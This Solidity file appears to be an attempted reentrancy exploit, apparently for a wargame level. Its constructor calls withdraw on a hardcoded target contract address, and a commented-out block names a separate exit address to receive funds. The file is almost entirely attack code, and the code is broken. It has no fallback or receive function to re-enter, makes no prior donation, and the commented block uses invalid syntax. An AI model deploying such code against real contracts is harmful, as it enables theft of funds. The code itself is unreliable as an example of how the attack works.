pragma solidity ^0.8.9;

interface IReentrance {
  function donate(address _to) external payable;
  function balanceOf(address _who) external view returns (uint balance);
  function withdraw(uint _amount) external;
  receive() external payable;
}

contract Reentrance {
  
  address targetAddress = 0x2dACBd8A689fe00552Af679FA71158FE41Ff28A2;
  address exitAddress = 0xB702DC679dCe8d27c77AC49A63B9A138B674929E;
  IReentrance targetContract; 

  constructor() payable {
    targetContract = IReentrance(payable(targetAddress));
    address(targetContract).call(
      abi.encodeWithSignature("withdraw(uint256)", 0.01 ether)
    );
    /*
    targetContract.withdraw(
      0.001 ether
      data: abi.encodeWithSignature("donate(address)", address(exitAddress))
    );
    */
      
  }
}
